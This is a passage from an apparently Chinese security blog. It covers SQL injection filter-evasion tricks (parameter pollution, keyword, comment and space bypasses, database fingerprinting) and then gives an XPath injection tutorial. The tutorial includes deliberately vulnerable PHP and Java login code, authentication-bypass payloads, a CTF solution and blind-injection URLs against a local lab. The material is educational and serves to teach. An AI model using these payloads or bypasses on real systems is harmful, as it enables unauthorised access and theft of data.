%23\n还有一些例如cookie注入，base64注入，和XFF注入，类型相似，不一一讲解了\nand ⇒ &amp;&amp;or =&gt; ||&lt; &gt; = =&gt; between() ,like limit 0,1  =&gt; limit 0 offset 1substr =&gt; substring mid left rightsleep =&gt; benchmark\n5.7 HTTP参数污染\n\n客户端在访问服务器端时，需要先经过一个tomcat服务器，这个tomcat服务器中部署的过滤代码充当了waf的功能。输入的参数经过tomcat服务器过滤后，再被传入到真正的服务端apache服务器上处理，然后逐层返回到客户端。\n  这里传入的参数只有一个，名为id，当我们强行传入两个名都为id的参数时，waf获取的是第一个参数，而忽略第二个参数，则对第二个参数的内容不做任何检查和过滤，这样第二个参数就可以传入到apache服务器端，进行解析。\n\n我们在url后面输入login.php进入到受waf保护的界面\n?id=0&amp;id=-1&#x27; union select 1,2,database() --+\n5.8 预编译绕过\n5.8.1 简介\nSQL注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。\n5.8.2 模拟预编译\n为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。\n5.8.3 绕过\n5.8.3.1 预编译使用错误\n预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。\n5.8.3.2 部分参数不可预编译\n在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。\n5.8.3.3 预编译实现错误\n部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。\n5.9 绕过or和and的\n1、大小写变形：将原本的 or 和 and 替换为：Or、oR、And、AND、aND、aNd等等。2、转换编码输入：将 or 和 and 使用hex，urlencode等编码方式进行转换后在输入。3、添加注释（内联注释）：例如：/*or*/，中间的语句会被mysql中解析（一般其他数据库不会）注释符如下:\t#\t--+\t/*xxx*/\t/*!xxx*/\t/*!50000xxx*/4、双写绕过：例如：oorr，aandnd 等。5、可以使用%26%26代替and。%26 代表字符 &#x27;&amp;&#x27; 。有时候&amp;&amp;不能用但是可以使用%26%26反正就这两个轮换着试验，哪个可行用哪个。6、利用符号：and替换为&amp;&amp;、or替换为||\n5.10 绕过空格和注释符\n绕过注释符方法：使用 or &#x27;1&#x27;=&#x27;1 或者 and &#x27;1&#x27;=&#x27;1 替换，这里理解一下注释符号的作用就可以，我们只要把后面的符号想办法闭合就可以，单引号可以随时替换，主要是根据sql语句的闭合方式决定使用什么符号闭合。        绕过空格方法：        1、/**/（注释绕过）        2、%09 Tab键（水平）        3、%0a 新建一行        4、%0c 新的一页        5、%0d return 键        6、%0b Tab键（垂直）        7、%a0 空格        8、() 绕过，主要通过括号去将某些语句独立起来，这样就不需要空格了。        以上都可以用来绕过。一般过滤了空格之后，联合注入以及双查询注入等就不推荐使用了（Windows系统的前提，如果是LINUX系统直接使用等价字符绕过空格就可以），最好使用报错注入中的 extractvalue()函数 以及 updatexml()函数 进行报错注入。\n0x06 Mysql常见函数\n\n\n\n=、&gt;、&gt;=、&lt;= 、&lt;&gt;\n比较运算符\n\n\n\n\nand、or\n逻辑运算符\n\n\nversion( )\nmysql数据库版本\n\n\ndatabase( )\n当前数据库名\n\n\nsleep( )\n睡眠时间为指定的秒数\n\n\nif(true,t,f)\nif判断\n\n\nlength( )\n返回字符串的长度\n\n\nsubstring( )\n截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度\n\n\nsubstr( )\n截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度\n\n\nmid( )\n截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度\n\n\nleft( )\n从左侧开始取指定字符个数的字符串\n\n\nconcat( )\n没有分隔符的连接字符串\n\n\nconcat_ws ( )\n含有分割符的连接字符串\n\n\ngroup_conat( )\n连接一个组的字符串\n\n\nord( )\n返回ASCII码\n\n\nascii( )\n返回ASCII码\n\n\nhex( )\n将字符串转换为十六进制\n\n\nunhex( )\nhex的反向操作\n\n\nmd5( )\n返回MD5值\n\n\nfloor(x)\n返回不大于x的最大整数\n\n\nround ( )\n返回参数x接近的整数\n\n\nrand( )\n返回0-1之间的随机浮点数\n\n\nload_file( )\n读取文件，并返回文件内容作为一个字符串\n\n\nfind_in_set( )\n返回字符串在字符串列表中的位置\n\n\nbenchmark( )\n指定语句执行的次数\n\n\nname_const ( )\n返回表作为结果\n\n\nuser( )\n用户名\n\n\ncurrent_user( )\n当前用户名\n\n\nsystem_ user( )\n系统用户名\n\n\n@@datadir\n数据库路径\n\n\n@@versoin_compile_os\n操作系统版本\n\n\n\nuser()                  //返回当前使用数据库的用户version()             //返回当前数据库的版本database()          //返回当前使用的数据库group_concat()  //多行数据拼接至一行显示+group_by根据分组排序concat_ws()        //把不同列的数据以特定字符隔开#  --  --+            //在MYSQL中的注释符   （注意:有时候注释符需要多试几种，有的时候--+不行，但是#可以）order by             //排序函数  判断列   原理：order by 后面跟哪个列名就是通过跟哪个列进行排序，如果后面跟的是数字，那么1就代表根据第一列排序，2代表第二列，3代表第三列，那么一直输入数字的大小就可以判断数据表有多少列了count()             //计数函数  报错时候可以用到，或者布尔注入和延时注入时查询有多少个表，多少个列的时候可以用到rand()              //产生一个随机数返回的随机数是大于等于 0 及小于 1 的均匀分布随机实数     报错注入时候有用updatexml(XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值extractvalue() :对XML文档进行查询的函数其实就是相当于我们熟悉的HTML文件中用 &lt;div&gt;&lt;p&gt;&lt;a&gt;标签查找元素一样语法：extractvalue(目标xml文档，xml路径)第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。\nINFORMATION_SCHEMA数据库\nmysql5.0以下没有该表\n\n0x07 数据库检测\n7.1 MySQL\n\n\nsleep sleep(1)\n\n\nbenchmark BENCHMARK(5000000, MD5('test'))\n\n\n\n\n字符串连接\nSELECT 'a' 'b'``SELECT CONCAT('some','string')\n\n\n\n\n\n\nversion\nSELECT @@version``SELECT version()\n\n\n\n\n\n\n识别用函数\nconnection_id()``last_insert_id()``row_count()\n\n\n\n\n7.2 Oracle\n\n\n\n\n字符串连接\n'a'||'oracle' --``SELECT CONCAT('some','string')\n\n\n\n\n\n\nversion\nSELECT banner FROM v$version``SELECT banner FROM v$version WHERE rownum=1\n\n\n\n\n7.3 SQLServer\n\n\nWAITFOR WAITFOR DELAY '00:00:10';\n\n\nSERVERNAME SELECT @@SERVERNAME\n\n\nversion SELECT @@version\n\n\n\n\n字符串连接\nSELECT 'some'+'string'\n\n\n\n\n\n\n常量\n@@pack_received``@@rowcount\n\n\n\n\n7.4 PostgreSQL\n\nsleep pg_sleep(1)\n\n","categories":["常见top漏洞"]},{"title":"浅析Xpath注入","url":"/2023/08/06/%E6%B5%85%E6%9E%90Xpath%E6%B3%A8%E5%85%A5/","content":"Xpath注入总结\n0x01 什么是Xpath\nXPath 即为 XML 路径语言，是 W3C  XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。它是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言,后来独立成了一种W3C标准。\nXPath 基于 XML 的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力，可用来在 XML 文档中对元素和属性进行遍历。\nXPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。\n**一句话总结：**XPath的作用就是用于在XML或HTML中查找信息，就像SQL语句的作用是在数据库中查询信息一样。\n0x02 Xpath的简单演示\nXpath语法的简单展示:    在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或成为根节点）。    nodename：选取此节点的所有节点    /： 从根节点选取    //：表示选取所有的子元素，不考虑其在文档的位置    .： 选取当前节点    ..：选取当前节点的父节点    @：选取属性 或@*: 匹配任何属性节点         *: 匹配任何元素节点    函数：    starts-with 匹配一个属性开始位置的关键字    contains 匹配一个属性值中包含的字符串    text（） 匹配的是显示文本信息\n//代码示例:&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;students&gt;    &lt;student number=&quot;1&quot;&gt;        &lt;name id=&quot;zs&quot;&gt;            &lt;xing&gt;张&lt;/xing&gt;            &lt;ming&gt;三&lt;/ming&gt;        &lt;/name&gt;        &lt;age&gt;18&lt;/age&gt;        &lt;sex&gt;male&lt;/sex&gt;    &lt;/student&gt;    &lt;student number=&quot;2&quot;&gt;        &lt;name id = &quot;ls&quot;&gt;李四&lt;/name&gt;        &lt;age&gt;24&lt;/age&gt;        &lt;sex&gt;female&lt;/sex&gt;    &lt;/student&gt;&lt;/students&gt;//这里根节点是&lt;students&gt;//像&lt;xing&gt;或者&lt;name&gt;这些都可以叫元素节点//id=&quot;zs&quot;这些事属性节点\n上边是一个简单的XML文档，那么接下来用Xpath来查语句（这里用python语言举例，但这里不知为何，我的python运行不了，可能版本不匹配了）\nfrom lxml import etreexml =&#x27;&#x27;&#x27;  &lt;students&gt;    &lt;student number=&quot;1&quot;&gt;        &lt;name id=&quot;zs&quot;&gt;            &lt;xing&gt;张&lt;/xing&gt;            &lt;ming&gt;三&lt;/ming&gt;        &lt;/name&gt;        &lt;age&gt;18&lt;/age&gt;        &lt;sex&gt;male&lt;/sex&gt;    &lt;/student&gt;    &lt;student number=&quot;2&quot;&gt;        &lt;name id = &quot;ls&quot;&gt;李四&lt;/name&gt;        &lt;age&gt;24&lt;/age&gt;        &lt;sex&gt;female&lt;/sex&gt;    &lt;/student&gt;&lt;/students&gt;&#x27;&#x27;&#x27;tree = etree.XML(xml)#选所有students，选第一个值-&gt;students-&gt;student-&gt;name-&gt;xing的文本out = tree.xpath(&#x27;//students&#x27;)[0][0][0][0].textprint(out)print(&#x27;-------------------------------------&#x27;)#所有name元素，第二个也就是李四那个,选它的文本out = tree.xpath(&#x27;//name&#x27;)[1].textprint(out)out = tree.xpath(&#x27;//name&#x27;)[1].xpath(&#x27;@id&#x27;)print(out)\n以下 是大佬的成功展示案例(通过这里我们可以体会到类似于sql查询的感觉)\n\n0x03 Xpath基础语法\n(1)查询基本语句\n//users/user[loginID/text()=’abc’ and password/text()=’test123’] 。\n这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1  就能绕过校验，成功获取所有user数据。\n//users/user[LoginID/text()=&#x27;&#x27;or 1=1 and password/text()=&#x27;&#x27;or 1=1]\n(2)节点类型\n在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或称为根节点）。 文档的根节点即是文档结点；对应属性有属性结点，元素有元素结点。\n\nelement (元素)\nattribute (属性)\ntext (文本)\nnamespace (命名空间)\nprocessing-instruction (处理指令)\ncomment (注释)\nroot (根节点)\n\n例如下面的XML文档\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;bookstore&gt;&lt;book&gt;  &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt;  &lt;author&gt;J K. Rowling&lt;/author&gt;  &lt;year&gt;2005&lt;/year&gt;  &lt;price&gt;29.99&lt;/price&gt;&lt;/book&gt;&lt;/bookstore\n&lt;bookstore&gt;       根节点&lt;author&gt;J K. Rowling&lt;/author&gt;    元素节点lang=&quot;en&quot;     属性节点\n下面是一个匹配节点的实例\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;bookstore&gt;&lt;book&gt;  &lt;title lang=&quot;eng&quot;&gt;Harry Potter&lt;/title&gt;  &lt;price&gt;29.99&lt;/price&gt;&lt;/book&gt;&lt;book&gt;  &lt;title lang=&quot;eng&quot;&gt;Learning XML&lt;/title&gt;  &lt;price&gt;39.95&lt;/price&gt;&lt;/book&gt;&lt;/bookstore&gt;\n路径表达式结果\n\n(4)限定语\n限定语是对路径表达式的附加条件,用来查找某个特定的节点或者包含某个指定的值的节点.限定语被嵌在方括号中，路径表达式结果：\n\n(5)通配符\nXPath 通配符可用来选取未知的 XML 元素.\n\n实例：\n\n更多细节参考:Xpa`th注入\n0x04XPath注入的定义\n​\t\tXPath注入攻击，是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath  查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。Xpath注入攻击本质上和SQL注入攻击是类似的，都是输入一些恶意的查询等代码字符串，从而对网站进行攻击。\n​\t\tXPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。\n0x05 xpath注入原理\n​\t\txpath注入的原理其实和sql注入很像， XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，**但是，注入的对象不是数据库users表了，而是一个存储数据的XML文件。**攻击者可以获取 XML 数据的组织结构，或者访问在正常情况下不允许访问的数据，如果 XML  数据被用于用户认证，那么攻击者就可以提升他的权限。\n​\t\t因为xpath不存在访问控制，所以我们不会遇到许多在SQL注入中经常遇到的访问限制。XML  中没有访问控制或者用户认证，如果用户有权限使用 XPath 查询，并且之间没有防御系统或者查询语句没有被防御系统过滤，那么用户就能够访问整个  XML 文档。 注入出现的位置也就是cookie，headers，request  parameters/input等。下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。\n​\t\t在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password）  两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名  （username）和密码（password）的结果来进行授权访问。\n例存在user.xml文件如下：\n&lt;users&gt;     &lt;user&gt;         &lt;firstname&gt;Ben&lt;/firstname&gt;         &lt;lastname&gt;Elmore&lt;/lastname&gt;         &lt;loginID&gt;abc&lt;/loginID&gt;         &lt;password&gt;test123&lt;/password&gt;     &lt;/user&gt;     &lt;user&gt;         &lt;firstname&gt;Shlomy&lt;/firstname&gt;         &lt;lastname&gt;Gantz&lt;/lastname&gt;         &lt;loginID&gt;xyz&lt;/loginID&gt;         &lt;password&gt;123test&lt;/password&gt;     &lt;/user&gt;\n则在XPath中其典型的查询语句如下：\n//users/user[loginID/text()=&#x27;xyz&#x27;and password/text()=&#x27;123test&#x27;]\n但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID =  ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。但如果用户传入类似 ’ or 1=1 or ‘’=’  的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：\n//users/user[loginID/text()=&#x27;&#x27;or 1=1 or &#x27;&#x27;=&#x27;&#x27; and password/text()=&#x27;&#x27; or 1=1 or &#x27;&#x27;=&#x27;&#x27;]\n​\t\t这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML  文档。攻击完成登录可以再通过XPath注入技术获取最高权限帐号和其它重要文档信息。延展开来，xpath的注入还有很多花样，像是通过updataxml()函数实现xpth报错注入，还有xpth的盲注。\n0x06 下面动手实操(以下都是跟着佬做的)\nXpath实例1\n主流脚本语言都支持对XPath的处理,下面我以PHP来学习XPath注入的原理：\nblog.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;    &lt;users&gt;        &lt;user&gt;            &lt;id&gt;1&lt;/id&gt;            &lt;username&gt;admin&lt;/username&gt;            &lt;password type=&quot;md5&quot;&gt;0192023a7bbd73250516f069df18b500&lt;/password&gt;        &lt;/user&gt;        &lt;user&gt;            &lt;id&gt;2&lt;/id&gt;            &lt;username&gt;jack&lt;/username&gt;            &lt;password type=&quot;md5&quot;&gt;1d6c1e168e362bc0092f247399003a88&lt;/password&gt;        &lt;/user&gt;        &lt;user&gt;            &lt;id&gt;3&lt;/id&gt;            &lt;username&gt;tony&lt;/username&gt;            &lt;password type=&quot;md5&quot;&gt;cc20f43c8c24dbc0b2539489b113277a&lt;/password&gt;        &lt;/user&gt;    &lt;/users&gt;    &lt;secret&gt;        &lt;flag&gt;flag&#123;My_f1rst_xp4th_iNjecti0n&#125;&lt;/flag&gt;    &lt;/secret&gt;&lt;/root&gt;\nindex.php\n&lt;?php$xml=simplexml_load_file(&#x27;blog.xml&#x27;);$name=$_GET[&#x27;name&#x27;];$pwd=md5($_GET[&#x27;pwd&#x27;]);$query= &quot;/root/users/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;echo $query;$result = $xml-&gt;xpath($query);if($result) &#123;    echo &#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;;    foreach ($result as $key =&gt; $value) &#123;        echo &#x27;&lt;br /&gt;ID:&#x27;.$value-&gt;id;        echo &#x27;&lt;br /&gt;Username:&#x27;.$value-&gt;username;    &#125;&#125;?&gt;\n代码很简单,实现了一个简单的登陆验证功能.其实和SQL注入相似,没有对用户输入的数据做过滤,导致攻击者可以直接注入”XPath表达式”，只要知道用户名就能绕过密码验证.\npayload:?name=admin&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=&#x27;&#x27;\n\n如果用户名没法得知,可以用两个”or”来绕过验证逻辑\npayload:?name=fake&#x27; or &#x27;1&#x27; or &#x27;1&amp;pwd=fake\n\nXpath实例二\n这里用一道赛题来举例：\n&lt;?php  $re = array(&#x27;and&#x27;,&#x27;or&#x27;,&#x27;count&#x27;,&#x27;select&#x27;,&#x27;from&#x27;,&#x27;union&#x27;,&#x27;group&#x27;,&#x27;by&#x27;,&#x27;limit&#x27;,&#x27;insert&#x27;,&#x27;where&#x27;,&#x27;order&#x27;,&#x27;alter&#x27;,&#x27;delete&#x27;,&#x27;having&#x27;,&#x27;max&#x27;,&#x27;min&#x27;,&#x27;avg&#x27;,&#x27;sum&#x27;,&#x27;sqrt&#x27;,&#x27;rand&#x27;,&#x27;concat&#x27;,&#x27;sleep&#x27;);setcookie(&#x27;injection&#x27;,&#x27;c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=&#x27;,time()+100000); if(file_exists(&#x27;t3stt3st.xml&#x27;)) &#123;     $xml = simplexml_load_file(&#x27;t3stt3st.xml&#x27;);     $user=$_GET[&#x27;user&#x27;];     $user=str_replace($re, &#x27; &#x27;, $user);     //$user=str_replace(&quot;&#x27;&quot;, &quot;&amp;apos&quot;, $user);     $query=&quot;user/username[@name=&#x27;&quot;.$user.&quot;&#x27;]&quot;;     $ans = $xml-&gt;xpath($query);     foreach($ans as $x =&gt; $x_value)     &#123;         echo $x.&quot;:  &quot; . $x_value;         echo &quot;&lt;br /&gt;&quot;;       &#125;  &#125;\n​\t\t通过访问/download.php?file=backup.zip下载网页源码，首先看到他过滤了sql注入的一些关键字，setcookie中有一段base64加密的密文，解码后得到的是：“sqli is not the only way for  injection”，根据提示sql不是唯一的注入方式，再结合下面对xml的一系列操作，可以确定这道题是用xpath注入，于是根据$query=“user/username[@name='”.$user.“']”;这一句可构造如下payload:\n$query=&quot;user/username[@name=&#x27;&#x27;]|//*|ss[&#x27;&#x27;]&quot;;\n这个payload中的   |ss  不太懂…\n\n\n这句payload的意思是闭合了“.$user.”前后的单引号同时执行三个操作，其中第二个操作//*即是关键点，列出文档中的所有元素，最后拿到flag\n浅浅分析一下:\t这里用|的原因是为了让该查询语句返回true,因为,user前后均为假,而  //*  会返回文档所有元素,因此为真\nxpath 实列原理三\n这边有个存放分数的xml文件：\nscore.xml:\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;root&gt;        &lt;class num=&#x27;1&#x27;&gt;                &lt;peo name=&#x27;tom&#x27;&gt;                        &lt;subject&gt;                                &lt;foo&gt;english&lt;/foo&gt;                                &lt;score&gt;60&lt;/score&gt;                        &lt;/subject&gt;                        &lt;subject&gt;                                &lt;foo&gt;chinese&lt;/foo&gt;                                &lt;score&gt;70&lt;/score&gt;                        &lt;/subject&gt;                        &lt;password&gt;qwer123&lt;/password&gt;                &lt;/peo&gt;                &lt;peo name=&#x27;helen&#x27;&gt;                        &lt;subject&gt;                                 &lt;foo&gt;english&lt;/foo&gt;                                &lt;score&gt;24&lt;/score&gt;                        &lt;/subject&gt;                        &lt;subject&gt;                                &lt;foo&gt;chinese&lt;/foo&gt;                                &lt;score&gt;34&lt;/score&gt;                        &lt;/subject&gt;                        &lt;password&gt;woaichishi&lt;/password&gt;                &lt;/peo&gt;                &lt;peo name=&#x27;vk&#x27;&gt;                        &lt;subject&gt;                                &lt;foo&gt;english&lt;/foo&gt;                                &lt;score&gt;100&lt;/score&gt;                        &lt;/subject&gt;                        &lt;subject&gt;                                &lt;foo&gt;chinese&lt;/foo&gt;                                &lt;score&gt;100&lt;/score&gt;                        &lt;/subject&gt;                        &lt;password&gt;vk123&lt;/password&gt;                &lt;/peo&gt;        &lt;/class&gt;&lt;/root&gt;\n查询分数的php是：\nscore.php\n&lt;?phpif (file_exists(&#x27;score.xml&#x27;))&#123;        $xml = simplexml_load_file(&#x27;score.xml&#x27;);  //获取xml文件里面的数据        if (isset($_GET[&#x27;user&#x27;]))&#123;                $user = $_GET[&#x27;user&#x27;];                 //构造语句                $en_scr = &quot;//peo[@name=&#x27;&#123;$user&#125;&#x27;]/subject[contains(foo, &#x27;english&#x27;)]/score&quot;;                $ch_scr = &quot;//peo[@name=&#x27;&#123;$user&#125;&#x27;]/subject[contains(foo, &#x27;chinese&#x27;)]/score&quot;;                $en_qu = $xml -&gt; xpath($en_scr);                $ch_qu = $xml -&gt; xpath($ch_scr);                foreach ($en_qu as $key =&gt; $value) &#123;                        echo $user.&#x27;:&lt;br&gt;english is &#x27;.$value;                &#125;                foreach ($ch_qu as $key =&gt; $value) &#123;                        echo &#x27;&lt;br&gt;&#x27;.&#x27;chinese is &#x27;.$value;                &#125;        &#125;else&#123;                echo &#x27;only have three user: vk, tom, helen.&#x27;;        &#125;&#125;?&gt;\n这里，php用simplexml_load_file()这个函数来访问那个存分数的xml文件,然后用xpath语法去查询数据。会php语言的慢慢看（重要！可加深理解），不会的跳过，先看效果：\n\n他说只有三个用户，那我们来查查helen的分数吧\n\n好了，反过来看看代码，它是怎么实现对xml文件的查询的？\n$en_scr = &quot;//peo[@name=&#x27;&#123;$user&#125;&#x27;]/subject[contains(foo, &#x27;english&#x27;)]/score&quot;;$ch_scr = &quot;//peo[@name=&#x27;&#123;$user&#125;&#x27;]/subject[contains(foo, &#x27;chinese&#x27;)]/score&quot;;\n\n图中框这个就相当于Sql中的语句，这就是xpath路径选取xml节点的语句。\n\n直接解释查询语句/peo 匹配到所有peo节点\n\n这节点不止一个，到底要哪个呢？[@name=&#x27;&#123;$user&#125;&#x27;]    接收到用户名字，来查询相应的节点（就是刚才的helen,vk）/subject             刚才peo节点下的subject节点这时候问题又来了，subject节点不止一个，哪个呢？[contains(foo, &#x27;english&#x27;)]   contains函数，第一个参数给出节点名，第二个写字符串意思就是，匹配出他的foo子节点中，信息含有english的那个/score 已经找到相应的subject了，然后就是找分数了。Score就是存放分数的节点：\n\n这样就能实现从xml文件中查询相应数据了!\n0x07 XPath盲注的方法\n盲注主要利用XPath的一些字符串操作函数和运算符.\n\n以前文的环境为例,如果我们想遍历出整个XML文档,一般步骤如下:\n1.判断根下节点数:(体现出来的就是回显正常,以下均是)\n127.0.0.1/xpath/index.php?name=1&#x27; or count(/*)=1 or &#x27;1&#x27;=&#x27;1&amp;pwd=fakeresult: 1\n2.猜解第一级节点:\n127.0.0.1/xpath/index.php?name=1&#x27; or substring(name(/*[position()=1]),1,1)=&#x27;r&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fake127.0.0.1/xpath/index.php?name=1&#x27; or substring(name(/*[position()=1]),2,1)=&#x27;o&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fake...result: root\n3.判断root的下一级节点数:\n127.0.0.1/xpath/index.php?name=1&#x27; or count(/root/*)=2 or &#x27;1&#x27;=&#x27;1&amp;pwd=fakeresult: 2\n4.猜解root的下一级节点:\n127.0.0.1/xpath/index.php?name=1&#x27; or substring(name(/root/*[position()=1]),1,1)=&#x27;u&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fake127.0.0.1/xpath/index.php?name=1&#x27; or substring(name(/root/*[position()=2]),1,1)=&#x27;s&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fakeresult: users,secret\n重复上述步骤直到猜解出所有节点，最后来猜解节点中的数据或属性值。\n5、猜解id为1的user节点下的username值,\n127.0.0.1/xpath/index.php?name=1&#x27; or substring(/root/users/user[id=1]/username,1,1)=&#x27;a&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fake...result: admin\n0x08 XPath攻击的实列\n一般说来，大多数 Web 应用程序使用关系数据库存储和检索信息。例如，如果您的 Web 站点需要身份验证，那么您可能拥有一个 users 表，其中包含惟一 ID、登录名、密码，也许还有一些其他信息，比如角色。从 users 表中检索用户的 SQL 查询可能类似于清单 1。\n清单 1从 users 表中检索用户的 SQL 查询\nSelect * from users where loginID=’foo’ and password=’bar’ \n在这个查询中，用户必须提供 loginID 和 password 作为输入。\n如果攻击者在 loginID 字段中输入：’ or 1=1 ,并在 password 中输入：’ or 1=1\n则形成的查询将类似清单 2。\n清单 2. 从攻击者输入形成的查询\nSelect * from users where loginID = ’’ or 1=1 and password=’ ’ or 1=1\n这个条件会一直匹配，因此攻击者可以进入系统。\nXPath 注入的原理大体类似。但是，假设您拥有的不是一个 users 表，而是一个 XML 文件，其中包含了如清单 3 所示的用户信息。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;users&gt;     &lt;user&gt;         &lt;firstname&gt;Ben&lt;/firstname&gt;        &lt;lastname&gt;Elmore&lt;/lastname&gt;         &lt;loginID&gt;abc&lt;/loginID&gt;         &lt;password&gt;test123&lt;/password&gt;     &lt;/user&gt;     &lt;user&gt;         &lt;firstname&gt;Shlomy&lt;/firstname&gt;        &lt;lastname&gt;Gantz&lt;/lastname&gt;        &lt;loginID&gt;xyz&lt;/loginID&gt;         &lt;password&gt;123test&lt;/password&gt;     &lt;/user&gt;     &lt;user&gt;         &lt;firstname&gt;Jeghis&lt;/firstname&gt;        &lt;lastname&gt;Katz&lt;/lastname&gt;        &lt;loginID&gt;mrj&lt;/loginID&gt;         &lt;password&gt;jk2468&lt;/password&gt;     &lt;/user&gt;     &lt;user&gt;         &lt;firstname&gt;Darien&lt;/firstname&gt;        &lt;lastname&gt;Heap&lt;/lastname&gt;        &lt;loginID&gt;drano&lt;/loginID&gt;         &lt;password&gt;2mne8s&lt;/password&gt;     &lt;/user&gt; &lt;/users&gt;\n在 XPath 中，类似于 SQL 查询的语句如清单 4 所示。\n清单 4. 匹配 SQL 查询的 XPath 语句\n//users/user[loginID/text()=’abc’ and password/text()=’test123’]\n要执行类似的攻击以绕过身份验证，如果攻击者在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1\n您可能会使用类似清单 5 的方法。\n清单 5. 绕过身份验证\n//users/user[LoginID/text()=’’ or 1=1 and password/text()=’’ or 1=1]\n您可能在 Java 应用程序中有一个诸如 doLogin 之类的方法，使用清单 3 中的 XML 文档再次执行身份验证。可能类似于清单 6。\n清单 6. XPathInjection.java\n import java.io.IOException; import org.w3c.dom.*; import org.xml.sax.SAXException; import javax.xml.parsers.*; import javax.xml.xpath.*;  public class XpathInjectionExample &#123; public boolean doLogin(String loginID, String password)  throws ParserConfigurationException, SAXException,IOException,   XPathExpressionException &#123;     DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();    domFactory.setNamespaceAware(true);    DocumentBuilder builder = domFactory.newDocumentBuilder();    Document doc = builder.parse(&quot;users.xml&quot;);    XPathFactory factory = XPathFactory.newInstance();    XPath xpath = factory.newXPath();    XPathExpression expr = xpath.compile(&quot;//users/user[loginID/text()=’&quot;+loginID+&quot;’ and password/text()=’&quot;+password+&quot;’ ]/firstname/text()&quot;);        Object result = expr.evaluate(doc, XPathConstants.NODESET);    NodeList nodes = (NodeList) result;    //print first names to the console     for (int i = 0; i &lt; nodes.getLength(); i++) &#123;        System.out.println(nodes.item(i).getNodeValue());    &#125;    if (nodes.getLength() &gt;= 1) &#123;             return true;    &#125;else&#123;         return false;    &#125;    &#125;&#125;\n0x09 